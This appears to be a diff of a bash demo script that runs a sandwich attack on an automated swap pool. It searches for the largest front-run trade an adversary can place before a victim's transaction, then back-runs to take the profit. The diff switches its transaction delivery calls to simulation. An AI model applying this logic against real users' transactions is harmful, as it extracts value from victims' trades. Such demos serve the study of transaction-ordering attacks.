@@ -1,3 +1,4 @@
+#!/bin/bash
 set -e
 
 source ./scripts/demo_utils.sh
@@ -29,9 +30,9 @@ while [ $(expr $hi - $lo) -ne 1 ]; do
   generate_and_sign_tx token_a $mid 0 $ADV adv
   echo "adv tx token_a $mid 0"
 
-  deliver_tx adv
+  simulate_tx adv
   old_pool_a=$(query_pool pool_a)
-  deliver_tx victim
+  simulate_tx victim
   new_pool_a=$(query_pool pool_a)
   dif_pool_a=$(($new_pool_a - $old_pool_a))
   echo 'dif' $dif_pool_a
@@ -45,7 +46,7 @@ done
 set_snapshot "${snapshot_uniq_label}-${cnt}"
 echo "final front-run tx token_a $lo 0"
 old_pool_b=$(query_pool pool_b)
-deliver_tx adv
+simulate_tx adv
 new_pool_b=$(query_pool pool_b)
 dif_pool_b=$(($old_pool_b - $new_pool_b))
 generate_and_sign_tx token_b $dif_pool_b 0 $ADV adv_back
@@ -54,9 +55,9 @@ echo "final back-run tx token_b $dif_pool_b 0"
 echo
 # broadcast all 3 txs
 set_snapshot "${snapshot_uniq_label}-final"
-deliver_tx adv
-deliver_tx victim
-deliver_tx adv_back
+simulate_tx adv
+simulate_tx victim
+simulate_tx adv_back
 
 ## broadcast all 3 txs
 #reset_snapshot
